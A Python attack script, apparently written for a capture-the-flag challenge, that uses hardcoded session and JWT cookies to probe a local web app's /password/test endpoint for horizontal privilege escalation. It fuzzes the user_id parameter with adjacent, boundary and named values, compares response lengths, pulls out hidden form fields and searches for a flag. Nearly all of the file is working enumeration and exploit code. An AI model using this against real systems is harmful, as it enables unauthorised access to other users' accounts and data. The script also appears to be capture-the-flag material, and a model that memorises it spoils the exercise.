import requests
import re

# Base information from context  
base_url = "http://127.0.0.1"
endpoint = "/password/test"

# Authentication cookies from context
cookies = {
    'auth_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs',
    'session': 'eyJ1c2VyX2lkIjoxMDAzMn0.aVWMEQ.ysLVLWZ3r1aYnccVIPMb7n4vSNE'
}

print("Testing access to password endpoint for horizontal privilege escalation")
print(f"Target URL: {base_url}{endpoint}")
print(f"Authenticated as user_id: 10032 (username: test)")
print("-" * 80)

# First, establish baseline with current user_id
print("\n[BASELINE] Accessing /password/test with current session")
try:
    response = requests.get(base_url + endpoint, cookies=cookies, timeout=15)
    print(f"Status: {response.status_code}")
    print(f"Response length: {len(response.text)}")
    print(f"Response content:\n{response.text}")
    
    baseline_length = len(response.text)
    print(f"Baseline established: {baseline_length} characters")
    
    # Look for user_id in hidden fields
    hidden_user_id = re.search(r'<input[^>]*name=["\']?user_id["\']?[^>]*value=["\']?([^"\'\s]+)["\']?[^>]*>', response.text, re.IGNORECASE)
    hidden_username = re.search(r'<input[^>]*name=["\']?username["\']?[^>]*value=["\']?([^"\'\s]+)["\']?[^>]*>', response.text, re.IGNORECASE)
    
    if hidden_user_id:
        print(f"Hidden user_id field value: {hidden_user_id.group(1)}")
    if hidden_username:
        print(f"Hidden username field value: {hidden_username.group(1)}")
        
except Exception as e:
    print(f"Error accessing baseline: {e}")
    baseline_length = 0

print("\n" + "-" * 80)
print("[FUZZING] Testing user_id parameter manipulation")
print("-" * 80)

# Test various user_id values to find other users' data
test_values = [
    "10030", "10031", "10033", "10034",  # Adjacent IDs
    "1", "10", "100", "1000",  # Lower range
    "99999", "99998", "99997",  # Upper range  
    "admin", "root", "system"   # Common names
]

success_count = 0
for test_val in test_values:
    try:
        print(f"\nTesting user_id={test_val}")
        
        # Try GET with query parameter
        test_url = f"{base_url}{endpoint}?user_id={test_val}"
        response = requests.get(test_url, cookies=cookies, timeout=15)
        
        print(f"  GET Status: {response.status_code}")
        print(f"  Response length: {len(response.text)}")
        
        # Check if different from baseline
        if len(response.text) != baseline_length:
            print(f"  [!] Different response detected!")
            
            # Look for flag
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"  [!!!] FLAG FOUND: {flag_match.group(0)}")
                success_count += 1
            else:
                # Show first 200 chars of different response
                preview = response.text[:200].replace('\n', ' ') 
                print(f"  Response preview: {preview}...")
        else:
            print(f"  No difference from baseline")
            
    except Exception as e:
        print(f"  Error: {e}")

print(f"\n{'='*80}")
print(f"[SUMMARY] Tests completed. Found {success_count} different responses.")
print(f"{'='*80}")
